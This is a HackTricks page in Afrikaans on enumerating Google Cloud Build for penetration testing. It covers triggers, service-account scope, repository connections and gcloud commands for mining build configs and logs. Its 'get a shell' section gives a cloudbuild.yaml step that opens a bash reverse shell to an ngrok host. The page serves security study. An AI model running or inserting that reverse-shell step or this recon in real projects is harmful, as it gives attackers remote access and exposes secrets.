# GCP - Wolkbou Enum

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Basiese Inligting

Google Cloud Build is 'n bestuurde CI/CD-platform wat **sagtewarebou-** en vrystellingsprosesse outomatiseer, integreer met **bronkode-opgaarplekke** en 'n wye verskeidenheid programmeertaal ondersteun. Dit **stel ontwikkelaars in staat om kode outomaties te bou, te toets en te implementeer**, terwyl dit die buigsaamheid bied om boustappe en werkstrome aan te pas.

Elke Cloud Build Trigger is **verwant aan 'n Cloud Repository of direk gekoppel aan 'n eksterne opgaarplek** (Github, Bitbucket en Gitlab).

{% hint style="success" %}
Ek kon nie enige manier sien om die Github/Bitbucket-token hier of vanaf Cloud Repositories te steel nie, omdat wanneer die opgaarplek afgelaai word, dit via 'n [https://source.cloud.google.com/](https://source.cloud.google.com/) URL toegang kry en Github nie deur die kli√´nt benader word nie.
{% endhint %}

### Gebeure

Die Cloud Build kan geaktiveer word as:

* **Druk na 'n tak**: Spesifiseer die tak
* **Druk 'n nuwe etiket**: Spesifiseer die etiket
* **Pull-aanvraag**: Spesifiseer die tak wat die PR ontvang
* **Handmatige aanroeping**
* **Pub/Sub-boodskap**: Spesifiseer die onderwerp
* **Webhook-gebeurtenis**: Sal 'n HTTPS-URL blootstel en die versoek moet ge√Ødentifiseer word met 'n geheim

### Uitvoering

Daar is 3 opsies:

* 'n yaml/json wat die opdragte spesifiseer om uit te voer. Gewoonlik: `/cloudbuild.yaml`
* Slegs een wat "inline" in die webkonsol en in die opdraglyn gespesifiseer kan word
* Mees algemene opsie
* Relevant vir ongeagte toegang
* 'n **Dockerfile** om te bou
* 'n **Buildpack** om te bou

### SA-permissies

Die **Service Account het die `cloud-platform`-omvang**, sodat dit **alle voorregte kan gebruik.** As **geen SA gespesifiseer is** (soos wanneer dit ingedien word), sal die **standaard SA** `<proj-nommer>@cloudbuild.gserviceaccount.com` **gebruik word.**

Standaard word geen toestemmings gegee nie, maar dit is redelik maklik om dit te gee:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Goedkeurings

Dit is moontlik om 'n Cloud Build te konfigureer om **goedkeuring vir bou-uitvoerings te vereis** (standaard gedeaktiveer).

### Verbindings & Opgaarplekke

Verbindings kan geskep word oor:

* **GitHub:** Dit sal 'n OAuth-aanvraag vertoon wat vra vir toestemmings om 'n **Github-token te kry** wat binne die **Secret Manager** gestoor sal word.
* **GitHub Enterprise:** Dit sal vra om 'n **GithubApp** te installeer. 'n **Identifikasietoken** vanaf jou GitHub Enterprise-gashuis sal geskep en in hierdie projek as 'n **Secret Manager**-geheim gestoor word.
* **GitLab / Enterprise:** Jy moet die API-toegangstoken en die Leestoegangstoken vir die API **verskaf wat in die Secret Manager gestoor sal word.**

Sodra 'n verbinding gegenereer is, kan jy dit gebruik om **opgaarplekke wat die Github-rekening toegang tot het**, te koppel.

Hierdie opsie is beskikbaar deur die knoppie:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Let daarop dat opgaarplekke wat met hierdie metode gekoppel is, **slegs beskikbaar is in Triggers wat 2de generasie gebruik.**
{% endhint %}

### Koppel 'n Opgaarplek

Dit is nie dieselfde as 'n **`verbindings`** nie. Dit bied **verskillende** maniere om **toegang tot 'n Github- of Bitbucket**-opgaarplek te kry, maar **skep nie 'n verbindingsvoorwerp nie, maar dit skep wel 'n opgaarplekvoorwerp (van 1ste generasie).**

Hierdie opsie is beskikbaar deur die knoppie:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Berging

Soms sal Cloud Build 'n nuwe berging genereer om die l√™ers vir die trigger te stoor. Dit gebeur byvoorbeeld in die voorbeeld wat GCP aanbied met:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
'n Stoorbak genaamd [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) is geskep om 'n `.tgz` te stoor met die l√™ers wat gebruik moet word.

### Kry skulpry
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Opname

Jy kan **sensitiewe inligting in boukonfigurasies en logboeke** vind.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Voorregverhoging

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Ongeagte Toegang

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Na-uitbuiting

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
